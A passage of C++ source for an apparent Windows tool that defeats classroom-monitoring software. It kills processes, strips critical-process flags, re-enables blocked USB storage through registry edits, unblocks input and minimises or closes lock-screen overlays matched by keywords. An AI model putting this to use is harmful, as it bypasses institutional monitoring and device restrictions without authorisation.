                    std::cerr << "方法 " << (i + 1) << " 执行出错: " << e.what() << std::endl;
                }
                catch (...) {
                    std::cerr << "方法 " << (i + 1) << " 执行出错: 未知错误" << std::endl;
                }
            }
        }

    // 最终检查进程状态
    bool processStillRunning = isProcessRunning(processName);

    if (processWasRunning && !processStillRunning) {
        std::cout << "进程已成功终止!" << std::endl;
        return true;
    }
    else if (!processWasRunning) {
        std::cout << "进程原本就不在运行状态!" << std::endl;
        return true;
    }
    else {
        std::cout << "所有方法都无法终止进程。" << std::endl;
        return false;
    }
}
void RemoveCriticalProcessFlags(const std::vector<std::string>& processNames)
{
    // 获取系统进程快照
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        std::wcerr << L"无法创建进程快照" << std::endl;
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // 遍历所有进程
    if (Process32First(hSnapshot, &pe32))
    {
        do
        {
            // 将宽字符进程名转换为多字节字符串
            char processName[MAX_PATH];
            WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1,
                processName, MAX_PATH, NULL, NULL);

            // 检查是否在目标进程列表中
            for (const auto& targetName : processNames)
            {
                if (targetName == processName)
                {
                    // 找到匹配进程，尝试移除关键标识
                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
                    if (hProcess != nullptr)
                    {
                        // 使用NtSetInformationProcess移除关键标识
                        typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(
                            HANDLE ProcessHandle,
                            ULONG ProcessInformationClass,
                            PVOID ProcessInformation,
                            ULONG ProcessInformationLength);

                        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
                        if (hNtdll)
                        {
                            pNtSetInformationProcess NtSetInformationProcess =
                                reinterpret_cast<pNtSetInformationProcess>(
                                    GetProcAddress(hNtdll, "NtSetInformationProcess"));

                            if (NtSetInformationProcess)
                            {
                                DWORD breakOnTermination = 0;
                                NTSTATUS status = NtSetInformationProcess(
                                    hProcess,
                                    29, // ProcessBreakOnTermination
                                    &breakOnTermination,
                                    sizeof(breakOnTermination));

                                // 可选：记录操作结果
                                if (NT_SUCCESS(status))
                                {
                                    std::wcout << L"成功移除进程 " << pe32.szExeFile
                                        << L" (PID: " << pe32.th32ProcessID
                                        << L") 的关键标识" << std::endl;
                                }
                            }
                        }

                        CloseHandle(hProcess);
                    }
                    break; // 跳出内层循环，继续查找下一个进程
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
}
// 多进程终止方法
bool ProcessTerminator::terminateMultipleProcesses(const std::vector<std::string>& processNames) {
    GQS(processNames);
    RemoveCriticalProcessFlags(processNames);
    if (processNames.empty()) {
        std::cout << "没有提供进程名!" << std::endl;
        return false;
    }

    std::cout << "开始终止 " << processNames.size() << " 个进程..." << std::endl;

    bool allTerminated = true;
    std::vector<std::thread> threads;
    std::vector<bool> results(processNames.size(), false);

    // 使用多线程同时终止多个进程
    for (size_t i = 0; i < processNames.size(); ++i) {
        threads.emplace_back([i, &processNames, &results]() {
            try {
                std::cout << "开始终止进程: " << processNames[i] << std::endl;
                results[i] = terminateByAllMethods(processNames[i]);
            }
            catch (const std::exception& e) {
                std::cerr << "终止进程 " << processNames[i] << " 时出错: " << e.what() << std::endl;
                results[i] = false;
            }
            catch (...) {
                std::cerr << "终止进程 " << processNames[i] << " 时出错: 未知错误" << std::endl;
                results[i] = false;
            }
            });
    }

    // 等待所有线程完成
    for (auto& thread : threads) {
        thread.join();
    }

    // 检查结果
    for (size_t i = 0; i < processNames.size(); ++i) {
        if (!results[i]) {
            std::cout << "进程 " << processNames[i] << " 终止失败!" << std::endl;
            allTerminated = false;
        }
        else {
            std::cout << "进程 " << processNames[i] << " 终止成功!" << std::endl;
        }
    }

    return allTerminated;
}

// 验证文件是否有微软数字签名
bool ProcessTerminator::IsMicrosoftSigned(const std::wstring& filePath) {
    if (filePath.empty()) return false;
    
    // 检查文件是否存在
    DWORD attribs = GetFileAttributesW(filePath.c_str());
    if (attribs == INVALID_FILE_ATTRIBUTES) return false;
    
    WINTRUST_FILE_INFO fileInfo = { 0 };
    fileInfo.cbStruct = sizeof(WINTRUST_FILE_INFO);
    fileInfo.pcwszFilePath = filePath.c_str();
    fileInfo.hFile = NULL;
    fileInfo.pgKnownSubject = NULL;

    GUID actionGuid = WINTRUST_ACTION_GENERIC_VERIFY_V2;
    
    WINTRUST_DATA winTrustData = { 0 };
    winTrustData.cbStruct = sizeof(WINTRUST_DATA);
    winTrustData.pPolicyCallbackData = NULL;
    winTrustData.pSIPClientData = NULL;
    winTrustData.dwUIChoice = WTD_UI_NONE;
    winTrustData.fdwRevocationChecks = WTD_REVOKE_NONE;
    winTrustData.dwUnionChoice = WTD_CHOICE_FILE;
    winTrustData.pFile = &fileInfo;
    winTrustData.dwStateAction = WTD_STATEACTION_VERIFY;
    winTrustData.hWVTStateData = NULL;
    winTrustData.pwszURLReference = NULL;
    winTrustData.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;
    winTrustData.dwUIContext = 0;

    LONG status = WinVerifyTrust(NULL, &actionGuid, &winTrustData);
    
    bool isMicrosoftSigned = false;
    
    if (status == ERROR_SUCCESS) {
        CRYPT_PROVIDER_DATA* pProvData = WTHelperProvDataFromStateData(winTrustData.hWVTStateData);
        if (pProvData) {
            CRYPT_PROVIDER_SGNR* pProvSigner = WTHelperGetProvSignerFromChain(pProvData, 0, FALSE, 0);
            if (pProvSigner) {
                CRYPT_PROVIDER_CERT* pProvCert = WTHelperGetProvCertFromChain(pProvSigner, 0);
                if (pProvCert && pProvCert->pCert) {
                    wchar_t szSubjectName[256] = { 0 };
                    DWORD dwSubjectNameSize = sizeof(szSubjectName);
                    
                    if (CertGetNameStringW(pProvCert->pCert, CERT_NAME_SIMPLE_DISPLAY_TYPE,
                        0, NULL, szSubjectName, dwSubjectNameSize) > 0) {
                        std::wstring subjectName = szSubjectName;
                        std::transform(subjectName.begin(), subjectName.end(), subjectName.begin(), ::towlower);
                        
                        if (subjectName.find(L"microsoft") != std::wstring::npos) {
                            isMicrosoftSigned = true;
                        }
                    }
                }
            }
        }
    }
    
    // 清理
    winTrustData.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(NULL, &actionGuid, &winTrustData);
    
    return isMicrosoftSigned;
}

// 独立函数实现（在ProcessTerminator类方法之后）
bool ForceSetForegroundWindow(HWND hwnd);

bool RestoreUSBStorageDevices() {
    return ProcessTerminator::RestoreUSBStorage();
}

bool RestoreInputDevices() {
    return ProcessTerminator::RestoreInputDevices();
}

bool RemoveFullscreenOverlays() {
    return ProcessTerminator::DetectAndRemoveFullscreenOverlays();
}

// 最小化覆盖窗口（用于黑屏肃静状态下显示程序窗口）
void MinimizeOverlayWindows() {
    // 检测可疑窗口并移除
    EnumWindows([](HWND hwnd, LPARAM) -> BOOL {
        if (!hwnd || !IsWindow(hwnd)) return TRUE;
        
        DWORD pid;
        GetWindowThreadProcessId(hwnd, &pid);
        if (pid == GetCurrentProcessId()) return TRUE;
        
        wchar_t className[256] = {};
        wchar_t windowTitle[256] = {};
        
        GetClassNameW(hwnd, className, 256);
        GetWindowTextW(hwnd, windowTitle, 256);
        
        LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
        LONG style = GetWindowLongW(hwnd, GWL_STYLE);
        
        RECT rect;
        if (!GetWindowRect(hwnd, &rect)) return TRUE;
        
        int winW = rect.right - rect.left;
        int winH = rect.bottom - rect.top;
        int screenW = GetSystemMetrics(SM_CXSCREEN);
        int screenH = GetSystemMetrics(SM_CYSCREEN);
        
        // 检测窗口尺寸（小窗口策略）
        bool isSmallWindow = (winW >= 50 && winW <= 200 && winH >= 20 && winH <= 150);
        bool isMediumWindow = (winW >= 80 && winW <= 200 && winH >= 30 && winH <= 100);
        bool isFullscreen = (winW >= screenW * 0.95f && winH >= screenH * 0.95f);
        bool isLargeWindow = (winW >= screenW * 0.5f && winH >= screenH * 0.5f);
        
        // 检测窗口位置（左上角区域，适合多个小窗口布局）
        bool isTopLeftArea = (rect.left >= 0 && rect.left <= 500 && rect.top >= 0 && rect.top <= 300);
        
        // 检测可疑类名（直接）
        bool suspiciousClassDirect = wcsstr(className, L"DXGI") != nullptr ||
                             wcsstr(className, L"D3D") != nullptr ||
                             wcsstr(className, L"Overlay") != nullptr ||
                             wcsstr(className, L"Hook") != nullptr ||
                             wcsstr(className, L"Monitor") != nullptr ||
                             wcsstr(className, L"Control") != nullptr ||
                             wcsstr(className, L"Education") != nullptr ||
                             wcsstr(className, L"ApplicationFrame") != nullptr ||
                             wcsstr(className, L"Windows.UI.Core") != nullptr ||
                             wcsstr(className, L"WorkerW") != nullptr ||
                             wcsstr(className, L"Progman") != nullptr ||
                             wcsstr(className, L"Shell_TrayWnd") != nullptr;
        
        // 检测explorer窗口（用于小窗口策略）
        bool isExplorerClass = wcsstr(className, L"CabinetWClass") != nullptr ||
                             wcsstr(className, L"ExploreWClass") != nullptr ||
                             wcsstr(className, L"Internet Explorer") != nullptr ||
                             wcsstr(className, L"IEFrame") != nullptr ||
                             wcsstr(className, L"Frame Window") != nullptr ||
                             wcsstr(className, L"ShellTabWindowClass") != nullptr ||
                             wcsstr(className, L"CommandTargetClass") != nullptr ||
                             wcsstr(className, L"ReBarWindow32") != nullptr ||
                             wcsstr(className, L"AddressBandRoot") != nullptr ||
                             wcsstr(className, L"DirectUIHWND") != nullptr ||
                             wcsstr(className, L"DUIListView") != nullptr ||
                             wcsstr(className, L"SysTreeView32") != nullptr ||
                             wcsstr(className, L"SysListView32") != nullptr;
        
        // 检测Button类（可能是白色小窗口）
        bool isButtonClass = wcsstr(className, L"Button") != nullptr ||
                           wcsstr(className, L"Static") != nullptr;
        
        // 检测Windows默认窗口类
        bool isDefaultClass = wcsstr(className, L"#") != nullptr;
        
        // 检测可疑类名（变体）
        bool suspiciousClassVariant = wcsstr(className, L"Class") != nullptr ||
                             wcsstr(className, L"Room") != nullptr ||
                             wcsstr(className, L"Screen") != nullptr ||
                             wcsstr(className, L"Client") != nullptr ||
                             wcsstr(className, L"Server") != nullptr ||
                             wcsstr(className, L"Desk") != nullptr;
        
        // 检测可疑标题（直接）
        bool suspiciousTitleDirect = wcsstr(windowTitle, L"教室") != nullptr ||
                            wcsstr(windowTitle, L"监控") != nullptr ||
                            wcsstr(windowTitle, L"控制") != nullptr ||
                            wcsstr(windowTitle, L"锁定") != nullptr ||
                            wcsstr(windowTitle, L"肃静") != nullptr ||
                            wcsstr(windowTitle, L"黑屏") != nullptr ||
                            wcsstr(windowTitle, L"屏幕广播") != nullptr ||
                            wcsstr(windowTitle, L"电子教室") != nullptr;
        
        // 检测可疑标题（变体）
        bool suspiciousTitleVariant = wcsstr(windowTitle, L"课堂") != nullptr ||
                            wcsstr(windowTitle, L"教学") != nullptr ||
                            wcsstr(windowTitle, L"演示") != nullptr ||
                            wcsstr(windowTitle, L"投屏") != nullptr ||
                            wcsstr(windowTitle, L"互动") != nullptr ||
                            wcsstr(windowTitle, L"学习") != nullptr ||
                            wcsstr(windowTitle, L"考试") != nullptr ||
                            wcsstr(windowTitle, L"答题") != nullptr;
        
        // 检测无标题或特殊标题
        bool noTitle = (windowTitle[0] == L'\0' || windowTitle[0] == L' ');
        
        bool isLayered = (exStyle & WS_EX_LAYERED) != 0;
        bool isTopmost = (exStyle & WS_EX_TOPMOST) != 0;
        bool isTransparent = (exStyle & WS_EX_TRANSPARENT) != 0;
        bool isToolWindow = (exStyle & WS_EX_TOOLWINDOW) != 0;
        bool isNoActivate = (exStyle & WS_EX_NOACTIVATE) != 0;
        
        // 检测条件
        bool shouldRemove = false;
        
        // 条件1：全屏 + 可疑类名（直接）
        if (isFullscreen && suspiciousClassDirect) shouldRemove = true;
        
        // 条件2：全屏 + 可疑标题
        if (isFullscreen && (suspiciousTitleDirect || suspiciousTitleVariant)) shouldRemove = true;
        
        // 条件3：置顶 + 分层 + 可疑标题
        if (isTopmost && isLayered && (suspiciousTitleDirect || suspiciousTitleVariant)) shouldRemove = true;
        
        // 条件4：透明 + 全屏 + 可疑变体
        if (isTransparent && isFullscreen && suspiciousClassVariant) shouldRemove = true;
        
        // 条件5：纯黑/纯色窗口（全屏无边框）
        if (isFullscreen && (style & WS_POPUP) != 0 && 
            (style & WS_CAPTION) == 0 && 
            (style & WS_BORDER) == 0 &&
            (suspiciousTitleDirect || suspiciousTitleVariant || suspiciousClassDirect || suspiciousClassVariant)) {
            shouldRemove = true;
        }
        
        // 条件6：无边框无标题的全屏弹出窗口
        if (isFullscreen && (style & WS_POPUP) != 0 && 
            (style & WS_CAPTION) == 0 && 
            (style & WS_BORDER) == 0 &&
            noTitle) {
            shouldRemove = true;
        }
        
        // 条件7：左上角的可疑大窗口（Runtime Broker伪装）
        if (isTopLeftArea && isLargeWindow && noTitle && 
            (suspiciousClassDirect || suspiciousClassVariant || isLayered || isTopmost)) {
            shouldRemove = true;
        }
        
        // 条件8：纯白/浅色背景可疑窗口
        if (isLargeWindow && noTitle &&
            (suspiciousClassDirect || suspiciousClassVariant || isLayered || isToolWindow)) {
            shouldRemove = true;
        }
        
        // 条件9：置顶的无标题大窗口
        if (isTopmost && isLargeWindow && noTitle && 
            (isLayered || isTransparent || isNoActivate)) {
            shouldRemove = true;
        }
        
        // 条件10：检测纯黑壁纸覆盖（非常大的无标题窗口）
        if (winW >= screenW * 0.8f && winH >= screenH * 0.8f && 
            (style & WS_POPUP) != 0 &&
            (noTitle || suspiciousClassDirect || suspiciousClassVariant)) {
            shouldRemove = true;
        }
        
        // 条件11：多个小白色窗口策略（100x40像素左右的窗口）
        // 如果是小窗口 + 可疑类名(Runtime Broker/Explorer) + 无标题 + 置顶
        if (isSmallWindow && noTitle && isTopmost && 
            (suspiciousClassDirect || isExplorerClass || isButtonClass || suspiciousClassVariant)) {
            shouldRemove = true;
        }
        
        // 条件12：中等尺寸窗口（可能是多个小窗口合并）
        if (isMediumWindow && noTitle && (isTopmost || isLayered) &&
            (suspiciousClassDirect || isExplorerClass)) {
            shouldRemove = true;
        }
        
        // 条件13：小窗口在屏幕左上区域密集排列（多个小窗口策略）
        if (isSmallWindow && noTitle && isTopLeftArea &&
            (suspiciousClassDirect || suspiciousClassVariant || isExplorerClass || isButtonClass)) {
            shouldRemove = true;
        }
        
        // 条件14：检测所有无标题的小窗口（如果同时存在多个）
        if (isSmallWindow && noTitle && isTopmost && isLayered) {
            shouldRemove = true;
        }
        
        // 条件15：Button类小窗口（可能是白色覆盖按钮）
        if (isSmallWindow && isButtonClass && isTopmost) {
            shouldRemove = true;
        }
        
        // 条件16：所有无标题的小窗口（放宽条件，用于检测纯白色覆盖窗口）
        if (isSmallWindow && noTitle && isTopmost) {
            shouldRemove = true;
        }
        
        // 条件17：无标题的小窗口 + 分层
        if (isSmallWindow && noTitle && isLayered) {
            shouldRemove = true;
        }
        
        // 条件18：检测Explorer进程的所有无标题子窗口
        if (isExplorerClass && isSmallWindow && noTitle && (isTopmost || isLayered)) {
            shouldRemove = true;
        }
        
        // 条件19：所有Explorer进程的小窗口（放宽条件）
        if (isExplorerClass && isSmallWindow && noTitle) {
            shouldRemove = true;
        }
        
        // 条件20：所有无标题的小窗口（最宽松条件）
        if (isSmallWindow && noTitle) {
            shouldRemove = true;
        }
        
        // 移除覆盖窗口
        if (shouldRemove) {
            // 最小化窗口而不是移除
            ShowWindow(hwnd, SW_MINIMIZE);
        }
        
        return TRUE;
    }, 0);
    
    // 额外：枚举所有窗口包括子窗口
    EnumWindows([](HWND hwnd, LPARAM) -> BOOL {
        // 枚举子窗口
        EnumChildWindows(hwnd, [](HWND childHwnd, LPARAM) -> BOOL {
            if (!childHwnd || !IsWindow(childHwnd)) return TRUE;
            
            DWORD pid;
            GetWindowThreadProcessId(childHwnd, &pid);
            if (pid == GetCurrentProcessId()) return TRUE;
            
            wchar_t className[256] = {};
            wchar_t windowTitle[256] = {};
            
            GetClassNameW(childHwnd, className, 256);
            GetWindowTextW(childHwnd, windowTitle, 256);
            
            LONG exStyle = GetWindowLongW(childHwnd, GWL_EXSTYLE);
            LONG style = GetWindowLongW(childHwnd, GWL_STYLE);
            
            RECT rect;
            if (!GetWindowRect(childHwnd, &rect)) return TRUE;
            
            int winW = rect.right - rect.left;
            int winH = rect.bottom - rect.top;
            
            // 检测小窗口
            bool isSmallWindow = (winW >= 50 && winW <= 200 && winH >= 20 && winH <= 150);
            bool noTitle = (windowTitle[0] == L'\0' || windowTitle[0] == L' ');
            bool isTopmost = (exStyle & WS_EX_TOPMOST) != 0;
            bool isLayered = (exStyle & WS_EX_LAYERED) != 0;
            
            // 检测Explorer相关类
            bool isExplorerClass = wcsstr(className, L"CabinetWClass") != nullptr ||
                                 wcsstr(className, L"ExploreWClass") != nullptr ||
                                 wcsstr(className, L"ShellTabWindowClass") != nullptr ||
                                 wcsstr(className, L"DirectUIHWND") != nullptr ||
                                 wcsstr(className, L"DUIListView") != nullptr ||
                                 wcsstr(className, L"SysTreeView32") != nullptr ||
                                 wcsstr(className, L"SysListView32") != nullptr ||
                                 wcsstr(className, L"Button") != nullptr ||
                                 wcsstr(className, L"Static") != nullptr;
            
            // 检测条件
            bool shouldRemove = false;
            
            // 所有Explorer子窗口（如果是小窗口+无标题）
            if (isExplorerClass && isSmallWindow && noTitle) {
                shouldRemove = true;
            }
            
            // 无标题小窗口 + 置顶
            if (isSmallWindow && noTitle && isTopmost) {
                shouldRemove = true;
            }
            
            // 无标题小窗口 + 分层
            if (isSmallWindow && noTitle && isLayered) {
                shouldRemove = true;
            }
            
            // 移除覆盖窗口
            if (shouldRemove) {
                // 最小化窗口而不是移除
                ShowWindow(childHwnd, SW_MINIMIZE);
            }
            
            return TRUE;
        }, 0);
        
        return TRUE;
    }, 0);
}

// USB存储恢复功能实现
bool ProcessTerminator::RestoreUSBStorage() {
    DMSP_VERIFY_RET(0x2009, false);  // USB解禁子函数 - 二级验证
    bool success = true;
    
    // 方法1: 启用USB存储设备
    success &= EnableUSBDevice(L"");
    
    // 方法2: 清除USB注册表限制
    success &= ClearUSBRegistryLimits();
    
    // 方法3: 尝试启动USBSTOR服务
    SC_HANDLE hSCManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (hSCManager) {
        SC_HANDLE hService = OpenServiceW(hSCManager, L"USBSTOR", SERVICE_START | SERVICE_QUERY_STATUS);
        if (hService) {
            SERVICE_STATUS status;
            if (QueryServiceStatus(hService, &status) && status.dwCurrentState == SERVICE_STOPPED) {
                StartServiceW(hService, 0, nullptr);
            }
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCManager);
    }
    
    return success;
}

bool ProcessTerminator::EnableUSBDevice(const std::wstring& deviceInstanceId) {
    GUID guid = GUID_DEVCLASS_USB;
    HDEVINFO hDevInfo = SetupDiGetClassDevsW(&guid, nullptr, nullptr, DIGCF_PRESENT);
    
    if (hDevInfo == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    SP_DEVINFO_DATA devInfoData = {};
    devInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
    
    bool foundDevice = false;
    
    for (DWORD i = 0; SetupDiEnumDeviceInfo(hDevInfo, i, &devInfoData); i++) {
        wchar_t instanceId[MAX_DEVICE_ID_LEN] = {};
        if (CM_Get_Device_IDW(devInfoData.DevInst, instanceId, MAX_DEVICE_ID_LEN, 0) != CR_SUCCESS) {
            continue;
        }
        
        // 检查是否为USB存储设备
        wchar_t compatibleIds[256] = {};
        DWORD buffersize = sizeof(compatibleIds);
        if (SetupDiGetDeviceRegistryPropertyW(hDevInfo, &devInfoData,
            SPDRP_COMPATIBLEIDS, nullptr, (PBYTE)compatibleIds, buffersize, nullptr)) {
            
            bool isStorage = wcsstr(compatibleIds, L"USBSTOR") != nullptr ||
                            wcsstr(compatibleIds, L"USB\\Class_08") != nullptr ||
                            wcsstr(compatibleIds, L"USB\\DevClass_08") != nullptr;
            
            if (isStorage) {
                // 获取设备状态
                DWORD status, problem;
                if (CM_Get_DevNode_Status(&status, &problem, devInfoData.DevInst, 0) == CR_SUCCESS) {
                    // 如果设备被禁用或有问题，尝试启用
                    if (problem == CM_PROB_DISABLED ||
                        (status & DN_DEVICE_DISABLED) ||
                        (status & DN_WILL_BE_REMOVED)) {
                        
                        // 启用设备 - 直接传入DEVINST值而不是指针
                        CONFIGRET cr = CM_Enable_DevNode(devInfoData.DevInst, 0);
                        if (cr == CR_SUCCESS) {
                            std::wcout << L"  [USB] 已启用设备: " << instanceId << std::endl;
                            foundDevice = true;
                        }
                    }
                }
            }
        }
    }
    
    SetupDiDestroyDeviceInfoList(hDevInfo);
    return foundDevice || true;
}

bool ProcessTerminator::ClearUSBRegistryLimits() {
    const wchar_t* keys[] = {
        L"SYSTEM\\CurrentControlSet\\Services\\USBSTOR",
        L"SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies",
        L"SYSTEM\\CurrentControlSet\\Control\\USB",
        L"SYSTEM\\CurrentControlSet\\Enum\\USB"
    };
    
    for (const wchar_t* keyPath : keys) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            // 尝试删除阻止USB的键值
            const wchar_t* values[] = { L"WriteProtect", L"EnableUsageCounting", L"DisableOnEject" };
            for (const wchar_t* valueName : values) {
                RegDeleteValueW(hKey, valueName);
            }
            
            // 如果Start值存在，设置为3（demand start）
            DWORD startValue = 3;
            RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE*)&startValue, sizeof(startValue));
            
            RegCloseKey(hKey);
        }
    }
    
    return true;
}

bool ProcessTerminator::RestoreInputDevices() {
    bool success = true;
    
    // 方法1: 解除输入阻塞
    success &= UnblockInput();
    
    // 方法2: 卸载全局输入钩子
    success &= UnhookGlobalInputHooks();
    
    // 方法3: 强制恢复前台窗口焦点
    HWND targetWnd = g_targetTopmostWindow;
    if (targetWnd && IsWindow(targetWnd)) {
        ForceSetForegroundWindow(targetWnd);
    }
    
    // 方法4: 查找并销毁可疑的焦点拦截窗口
    std::vector<HWND> interceptWindows;
    
    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
        if (!IsWindowVisible(hwnd)) return TRUE;
        
        wchar_t className[256] = {};
        GetClassNameW(hwnd, className, 256);
        
        wchar_t windowTitle[256] = {};
        GetWindowTextW(hwnd, windowTitle, 256);
        
        // 检测可疑类名（全局钩子类）
        bool suspiciousClass = wcsstr(className, L"Hook") != nullptr ||
                            wcsstr(className, L"Global") != nullptr ||
                            wcsstr(className, L"Input") != nullptr ||
                            wcsstr(className, L"Keyboard") != nullptr ||
                            wcsstr(className, L"Mouse") != nullptr ||
                            wcsstr(className, L"KeyboardHook") != nullptr ||
                            wcsstr(className, L"MouseHook") != nullptr ||
                            wcsstr(className, L"WH_KEYBOARD") != nullptr ||
                            wcsstr(className, L"WH_MOUSE") != nullptr ||
                            wcsstr(className, L"Monitor") != nullptr ||
                            wcsstr(className, L"Control") != nullptr ||
                            wcsstr(className, L"Education") != nullptr;
        
        // 检测可疑标题
        bool suspiciousTitle = wcsstr(windowTitle, L"教室") != nullptr ||
                            wcsstr(windowTitle, L"监控") != nullptr ||
                            wcsstr(windowTitle, L"控制") != nullptr ||
                            wcsstr(windowTitle, L"锁定") != nullptr ||
                            wcsstr(windowTitle, L"屏幕广播") != nullptr ||
                            wcsstr(windowTitle, L"电子教室") != nullptr ||
                            wcsstr(windowTitle, L"学生机") != nullptr ||
                            wcsstr(windowTitle, L"教师端") != nullptr;
        
        // 检查窗口是否具有WS_EX_TOPMOST样式
        LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
        bool isTopmost = (exStyle & WS_EX_TOPMOST) != 0;
        
        if ((suspiciousClass || suspiciousTitle) && isTopmost) {
            std::vector<HWND>* windows = reinterpret_cast<std::vector<HWND>*>(lParam);
            windows->push_back(hwnd);
        }
        
        return TRUE;
    }, reinterpret_cast<LPARAM>(&interceptWindows));
    
    // 销毁可疑的焦点拦截窗口
    for (HWND hwnd : interceptWindows) {
        DWORD pid;
        GetWindowThreadProcessId(hwnd, &pid);
        
        if (pid != GetCurrentProcessId()) {
            PostMessageW(hwnd, WM_CLOSE, 0, 0);
            ShowWindow(hwnd, SW_HIDE);
        }
    }
    
    return success;
}

bool ProcessTerminator::UnblockInput() {
    // 尝试解除输入阻塞
    // 注意：BlockInput(FALSE)只有在被阻塞时返回true，
    // 如果没有阻塞则返回false，这是正常行为，不需要输出消息
    BlockInput(FALSE);
    return true;
}

bool ProcessTerminator::UnhookGlobalInputHooks() {
    // 查找可能的钩子窗口并尝试卸载
    HWND shellTray = FindWindowW(L"Shell_TrayWnd", nullptr);
    if (shellTray) {
        DWORD pid;
        GetWindowThreadProcessId(shellTray, &pid);
    }
    
    // 枚举所有顶级窗口查找可疑钩子
    EnumWindows([](HWND hwnd, LPARAM) -> BOOL {
        wchar_t className[256] = {};
        wchar_t windowTitle[256] = {};
        
        GetClassNameW(hwnd, className, 256);
        GetWindowTextW(hwnd, windowTitle, 256);
        
        // 检测可疑类名或标题
        bool suspicious = wcsstr(className, L"Hook") != nullptr ||
                         wcsstr(className, L"Keyboard") != nullptr ||
                         wcsstr(className, L"Mouse") != nullptr ||
                         wcsstr(windowTitle, L"Monitor") != nullptr ||
                         wcsstr(windowTitle, L"Control") != nullptr;
        
        if (suspicious && IsWindowVisible(hwnd)) {
            // 尝试销毁可疑窗口
            DWORD pid;
            GetWindowThreadProcessId(hwnd, &pid);
            
            // 检查是否是其他进程的窗口
            if (pid != GetCurrentProcessId()) {
                // 尝试发送关闭消息
                PostMessageW(hwnd, WM_CLOSE, 0, 0);
            }
        }
        return TRUE;
    }, 0);
    
    return true;
}

// 全屏覆盖检测与对抗功能实现
bool ProcessTerminator::IsSuspiciousOverlayWindow(HWND hwnd) {
    if (!hwnd || !IsWindow(hwnd)) return false;
    if (!IsWindowVisible(hwnd)) return false;
    
    wchar_t className[256] = {};
    wchar_t windowTitle[256] = {};
    
    GetClassNameW(hwnd, className, 256);
    GetWindowTextW(hwnd, windowTitle, 256);
    
    LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
    LONG style = GetWindowLongW(hwnd, GWL_STYLE);
    
    RECT rect;
    if (!GetWindowRect(hwnd, &rect)) return false;
    
    int width = rect.right - rect.left;
    int height = rect.bottom - rect.top;
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    
    bool isTopmost = (exStyle & WS_EX_TOPMOST) != 0;
    bool isPopup = (style & WS_POPUP) != 0;
    bool isFullscreen = (width >= screenW * 0.95f && height >= screenH * 0.95f);
    bool isLayered = (exStyle & WS_EX_LAYERED) != 0;
    bool isToolWindow = (exStyle & WS_EX_TOOLWINDOW) != 0;
    
    bool suspiciousClass = wcsstr(className, L"DXGI") != nullptr ||
                         wcsstr(className, L"D3D") != nullptr ||
                         wcsstr(className, L"Overlay") != nullptr ||
                         wcsstr(className, L"Hook") != nullptr ||
                         wcsstr(className, L"Fullscreen") != nullptr ||
                         wcsstr(className, L"Screen") != nullptr ||
                         wcsstr(className, L"Monitor") != nullptr ||
                         wcsstr(className, L"ClassRoom") != nullptr ||
                         wcsstr(className, L"Education") != nullptr ||
                         wcsstr(className, L"Control") != nullptr;
    
    bool suspiciousTitle = wcsstr(windowTitle, L"教室") != nullptr ||
                         wcsstr(windowTitle, L"监控") != nullptr ||
                         wcsstr(windowTitle, L"控制") != nullptr ||
                         wcsstr(windowTitle, L"屏幕") != nullptr ||
                         wcsstr(windowTitle, L"屏幕广播") != nullptr ||
                         wcsstr(windowTitle, L"学生机") != nullptr ||
                         wcsstr(windowTitle, L"教师端") != nullptr ||
                         wcsstr(windowTitle, L"电子教室") != nullptr;
    
    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);
    bool isOwnProcess = (pid == GetCurrentProcessId());
    
    if (isOwnProcess) return false;
    if (isToolWindow && !isFullscreen) return false;
    
    if ((isTopmost && isFullscreen) || (suspiciousClass && isFullscreen) || 
        (isLayered && isFullscreen && suspiciousTitle) ||
        (isPopup && isFullscreen && suspiciousTitle) ||
        (isTopmost && isLayered && isFullscreen)) {
        return true;
    }
    
    return false;
}

bool ProcessTerminator::DetectDXGIOverlayWindows(std::vector<HWND>& overlayWindows) {
    overlayWindows.clear();
    
    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
        if (ProcessTerminator::IsSuspiciousOverlayWindow(hwnd)) {
            std::vector<HWND>* windows = reinterpret_cast<std::vector<HWND>*>(lParam);
            windows->push_back(hwnd);
        }
        return TRUE;
    }, reinterpret_cast<LPARAM>(&overlayWindows));
    
    return !overlayWindows.empty();
}

bool ProcessTerminator::DetectGDILayeredOverlay(std::vector<HWND>& overlayWindows) {
    overlayWindows.clear();
    
    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
        if (!IsWindowVisible(hwnd)) return TRUE;
        
        LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
        LONG style = GetWindowLongW(hwnd, GWL_STYLE);
        
        if (!(exStyle & WS_EX_LAYERED)) return TRUE;
        
        RECT rect;
        if (!GetWindowRect(hwnd, &rect)) return TRUE;
        
        int width = rect.right - rect.left;
        int height = rect.bottom - rect.top;
        int screenW = GetSystemMetrics(SM_CXSCREEN);
        int screenH = GetSystemMetrics(SM_CYSCREEN);
        
        if (width >= screenW * 0.95f && height >= screenH * 0.95f) {
